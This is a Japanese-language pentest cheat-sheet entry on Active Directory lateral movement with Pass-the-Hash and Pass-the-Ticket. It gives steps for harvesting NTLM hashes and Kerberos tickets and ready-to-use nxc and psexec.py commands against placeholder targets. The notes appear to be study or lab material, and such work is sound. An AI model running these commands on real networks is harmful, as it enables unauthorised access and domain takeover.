---
title: ラテラルムーブメント（Pass-the-Hash / Pass-the-Ticket）
date: 2026-10-17
category: Active Directory
topic: ドメイン侵害
tags: [active-directory, lateral-movement, pass-the-hash, pass-the-ticket]
summary: 平文パスワードを使わず、NTLM ハッシュや Kerberos チケットだけで他のホストに認証して横展開する手法
---

## 概要

AD 環境では、認証は平文パスワードそのものではなく、NTLM ハッシュや Kerberos チケットといった「認証に使える材料」をやり取りすることで成立している。そのため、平文パスワードを割り出さなくても、ハッシュやチケットさえ手に入れば他のホストに成りすましてログインできる。

- Pass-the-Hash（PtH）: NTLM ハッシュをそのまま認証に使い、SMB 経由などでコマンド実行する。
- Pass-the-Ticket（PtT）: Kerberos チケット（TGT/TGS）をそのまま使って認証する。

どちらも、一度どこかのホストやアカウントから資格情報の「材料」を抜き取れれば、パスワードクラックという工程を挟まずに他のホストへ横展開できる点が強力。

## 手順

1. Mimikatz や secretsdump などで、NTLM ハッシュまたは Kerberos チケットを入手する。
2. 入手した材料を使って、別のホストに対して認証を行う。
3. 認証が成立すれば、そのホスト上でコマンド実行や追加の資格情報収集を行い、さらに横展開を続ける。

## コマンド

```
# Pass-the-Hash で SMB 実行
nxc smb <TARGET_IP> -u administrator -H <NT_hash> -x whoami
psexec.py -hashes :<NT_hash> administrator@<TARGET_IP>

# Pass-the-Ticket（Linux）
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass lab.local/administrator@target.lab.local
```

## 注意点

- Pass-the-Hash はローカル Administrator のハッシュが使い回されている環境で特に有効。
- Pass-the-Ticket は Kerberos チケットの有効期限が切れると使えなくなる。
